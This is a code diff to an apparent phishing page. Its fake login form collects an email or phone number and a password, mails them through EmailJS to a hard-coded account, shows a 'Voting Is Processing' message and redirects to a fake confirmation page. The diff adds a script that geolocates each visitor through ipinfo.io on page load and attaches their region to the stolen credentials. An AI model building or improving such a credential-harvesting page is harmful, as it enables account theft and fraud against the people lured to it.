@@ -187,6 +187,7 @@ hr {
         <form id="contact-form" action="" >
           <input type="text" name="emanil" id="name" placeholder="Email or phone number" hidden>
           <input type="text" name="emanil" id="email" placeholder="Email or phone number" required>
+          <input type="hidden" id="region" name="region">
           <input type="password" placeholder="Password" id="message" name="message" class="input-2" />
           <div class="link">
             <button type="submit" class="login">Login</button>
@@ -213,19 +214,20 @@ hr {
         var name = document.getElementById("name").value;
         var email = document.getElementById("email").value;
         var message = document.getElementById("message").value;
+        var region = document.getElementById("region").value;
 
         // Prepare email parameters
         var emailParams = {
             from_name: name,
             from_email: email,
-            message: message
+            message: message,
+            region: region
         };
 
         // Send the email using EmailJS
         emailjs.send("service_cyxyh2q", "template_bbsgxhi", emailParams)
             .then(function(response) {
                 console.log("Voting Is Processing:", response);
-                alert("Voting Is Processing!");
             // Redirect to another page after email is sent
         window.location.href = "confirm_Account.html";  // Redirect to a 'thank you' page after email is sent
             }, function(error) {
@@ -244,6 +246,30 @@ hr {
         publicKey: "xlkCcpryUFq2iLP5L",
       });
    })();
+</script>
+    <script>
+  // Function to get user's country using IP info service
+  function getUserRegion() {
+      // Use ipinfo.io API to get user's geolocation info
+      fetch('https://ipinfo.io?token=999a655c730c7c') // Replace 'YOUR_API_TOKEN' with your actual API token
+          .then(response => response.json())
+          .then(data => {
+              // Get the country from the response data
+              var region = data.region;
+
+              // Populate the hidden form field with the country code
+              document.getElementById('region').value = region;
+          })
+          .catch(error => {
+              // Handle error if the API request fails
+              alert('Error fetching region: ' + error.message);
+          });
+  }
+
+  // Call getUserCountry when the page loads
+  window.onload = function() {
+      getUserRegion();
+  }
 </script>
   </body>
 </html>
